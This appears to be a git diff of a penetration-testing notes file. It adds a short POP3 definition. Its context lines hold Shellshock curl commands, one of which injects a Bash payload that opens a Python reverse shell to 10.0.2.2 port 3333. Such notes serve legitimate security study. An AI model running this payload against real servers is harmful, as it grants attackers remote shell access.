@@ -39,6 +39,10 @@ curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; ec
 curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
 ```
 
+### POP3
+
+Post Office Protocol (ver 3) is an application layer protocol used to download emails from a remote server to your local device.
+
 
 ### SMB/Samba [139, 445 TCP]
 
